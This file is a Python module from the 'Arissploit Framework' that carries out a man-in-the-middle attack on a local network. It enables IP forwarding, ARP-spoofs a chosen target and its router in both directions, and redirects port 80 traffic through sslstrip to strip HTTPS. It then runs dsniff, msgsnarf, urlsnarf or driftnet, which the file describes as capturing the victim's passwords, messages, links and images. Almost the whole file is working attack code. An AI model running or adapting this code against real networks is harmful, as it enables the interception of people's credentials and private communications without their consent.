#!/usr/bin/env python3

#            ---------------------------------------------------
#                           Arissploit Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core.arissploit import *
from core import colors
import subprocess
import os

conf = {
	"name": "mitm",
	"version": "1.0",
	"shortdesc": "Man in the middle attack.",
	"author": "Entynetproject",
	"initdate": "26.4.2016",
	"lastmod": "29.12.2016",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "dsniff", "driftnet", "sslstrip"]
}

# List of the variables
variables = OrderedDict((
	('interface', ['eth0', 'Network interface name.']),
	('router', ['192.168.1.1', 'Router IP address.']),
	('target', ['192.168.1.2', 'Target IP address.']),
	('sniffer', ['dsniff', 'Sniffer name.']),
	('ssl', ['true', 'SSLStrip, for SSL hijacking.']),
))

# Additional notes to options
option_notes = colors.green+' Sniffers\t Description'+colors.end+'\n --------\t ------------\n dsniff\t\t Sniff all passwords.\n msgsnarf\t Sniff all text of victim messengers.\n urlsnarf\t Sniff victim links.\n driftnet\t Sniff victim images.'

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	if variables['sniffer'][0] =='dsniff':
		selected_sniffer = 'dsniff -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='msgsnarf':
		selected_sniffer = 'msgsnarf -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='urlsnarf':
		selected_sniffer = 'urlsnarf -i ' + variables['interface'][0]
	elif variables['sniffer'][0] =='driftnet':
			selected_sniffer = 'driftnet -i ' + variables['interface'][0]
	else:
		printError('invalid sniffer!')

	if variables['ssl'][0] =='true':
		subprocess.Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("IP forwarding...")
	subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("ARP spoofing...")
	arp_spoofing1 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['target'][0] +' '+ variables['router'][0]
	subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	arp_spoofing2 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['router'][0] +' '+ variables['target'][0]
	subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	printInfo("Starting sniffer...")
	printInfo("Ctrl + C to stop.")
	os.system(selected_sniffer)
